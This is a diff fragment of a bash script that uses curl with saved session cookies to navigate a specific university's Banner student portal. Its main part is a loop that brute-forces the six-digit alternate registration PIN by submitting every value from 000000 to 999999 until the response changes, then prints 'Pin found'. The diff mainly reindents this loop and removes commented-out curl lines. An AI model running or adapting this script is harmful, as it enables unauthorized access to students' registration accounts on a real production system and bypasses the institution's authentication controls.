@@ -10,19 +10,14 @@ curl -L -o receipt -b cookies.txt -c cookies.txt -X GET --url "https://bannerweb
 curl -L -o receipt -b cookies.txt -c cookies.txt -X GET --url "https://bannerweb.appstate.edu:443/pls/PROD/twbkwbis.P_GenMenu?name=bmenu.P_MainMnu"
 curl -L -o receipt -b cookies.txt -c cookies.txt -X GET --url "https://bannerweb.appstate.edu:443/pls/PROD/twbkwbis.P_GenMenu?name=bmenu.P_StuMainMnu"
 curl -L -o receipt -b cookies.txt -c cookies.txt -X GET --url "https://bannerweb.appstate.edu:443/pls/PROD/twbkwbis.P_GenMenu?name=bmenu.P_RegMnu"
-#curl -L -o receipt -b cookies.txt -c cookies.txt -X GET -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Encoding: gzip, deflate, sdch' --referer "https://bannerweb.appstate.edu/pls/PROD/twbkwbis.P_GenMenu?name=bmenu.P_StuMainMnu" --url "https://bannerweb.appstate.edu:443/pls/PROD/bwskflib.P_SelDefTerm"
-#curl -L -b cookies.txt -c cookies.txt -X POST -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Encoding: gzip, deflate, sdch' --data 'term_id=201540' --referer "https://bannerweb.appstate.edu/pls/PROD/twbkwbis.P_GenMenu?name=bmenu.P_RegMnu" --url "https://bannerweb.appstate.edu:443/pls/PROD/bwcklibs.P_StoreTerm"
 curl -L -b cookies.txt -c cookies.txt -X POST -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Encoding: gzip, deflate, sdch' --data 'term_in=201540' --referer "https://bannerweb.appstate.edu/pls/PROD/bwskfreq.P_AltPin" --url "https://bannerweb.appstate.edu:443/pls/PROD/bwskfreg.P_AltPin" -o receipt
 
 for pin in `seq -f "%06g"0 999999`; do
-echo $pin
-curl -L -b cookies.txt -c cookies.txt -X POST -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Encoding: gzip, deflate, sdch' --data "pin=$pin" --referer "https://bannerweb.appstate.edu/pls/PROD/bwskfreq.P_AltPin" --url "https://bannerweb.appstate.edu:443/pls/PROD/bwskfreg.P_CheckAltPin" -o receipt
-  if [ ! -n "`cat receipt | grep Alternate`" ]; then
-    echo "Pin found: $pin"  
-    break
-  fi
-sleep .5
+  echo $pin
+  curl -L -b cookies.txt -c cookies.txt -X POST -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Encoding: gzip, deflate, sdch' --data "pin=$pin" --referer "https://bannerweb.appstate.edu/pls/PROD/bwskfreq.P_AltPin" --url "https://bannerweb.appstate.edu:443/pls/PROD/bwskfreg.P_CheckAltPin" -o receipt
+    if [ ! -n "`cat receipt | grep Alternate`" ]; then
+      echo "Pin found: $pin"  
+      break
+    fi
+  sleep .5
 done
-#curl -L -b cookies.txt -c cookies.txt -X GET --referer "https://bannerweb.appstate.edu/pls/PROD/bwskfreq.P_AltPin" --url "https://bannerweb.appstate.edu/pls/PROD/bwskfreg.P_AltPin" -o receipt 
-
-#curl -b cookies.txt -c cookies.txt -X GET --url "https://portal4.appstate.edu/cp/home/login" -o receipt
